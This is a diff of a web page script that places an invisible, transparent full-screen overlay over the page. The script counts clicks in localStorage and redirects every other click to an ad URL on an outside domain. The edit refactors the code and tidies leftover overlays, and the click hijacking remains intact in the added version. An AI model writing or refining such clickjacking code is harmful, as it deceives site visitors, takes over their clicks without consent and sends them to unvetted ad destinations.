@@ -1,21 +1,15 @@
 document.addEventListener('DOMContentLoaded', () => {
-  // Read click count from localStorage
+  // Get current count
   let clickCount = parseInt(localStorage.getItem('adClickCount') || '0');
 
-  // Function to handle redirect and overlay
-  function handleRedirectClick() {
-    // Remove overlay immediately so it doesn't block the new page
-    overlay.remove();
-    // Increment click count and store
-    clickCount++;
-    localStorage.setItem('adClickCount', clickCount.toString());
-    // Redirect to your ad
-    window.location.href = 'https://flirtatiousmoviesbrightly.com/m5u0fm024?key=915f5541df37252209d1ab523c2cc8e5';
-  }
+  // Ensure no leftover overlays from previous sessions
+  const oldOverlay = document.getElementById('click-overlay');
+  if (oldOverlay) oldOverlay.remove();
 
   if (clickCount % 2 === 0) {
-    // If it's an odd-numbered user click (0, 2, 4...) which is 1st, 3rd, etc.
+    // Odd-numbered click (1st, 3rd, 5th...)
     const overlay = document.createElement('div');
+    overlay.id = 'click-overlay';
     overlay.style.position = 'fixed';
     overlay.style.top = 0;
     overlay.style.left = 0;
@@ -26,13 +20,18 @@ document.addEventListener('DOMContentLoaded', () => {
     overlay.style.background = 'transparent';
 
     document.body.appendChild(overlay);
-    overlay.addEventListener('click', handleRedirectClick);
-  } else {
-    // Even-numbered clicks (2nd, 4th...) — allow normal interaction
-    const removeOnce = () => {
+
+    overlay.addEventListener('click', () => {
+      overlay.remove(); // Clean up
       clickCount++;
       localStorage.setItem('adClickCount', clickCount.toString());
-    };
-    document.addEventListener('click', removeOnce, { once: true });
+      window.location.href = 'https://flirtatiousmoviesbrightly.com/m5u0fm024?key=915f5541df37252209d1ab523c2cc8e5';
+    });
+  } else {
+    // Even-numbered click (2nd, 4th...) — just count the click and allow normal use
+    document.addEventListener('click', () => {
+      clickCount++;
+      localStorage.setItem('adClickCount', clickCount.toString());
+    }, { once: true });
   }
 });
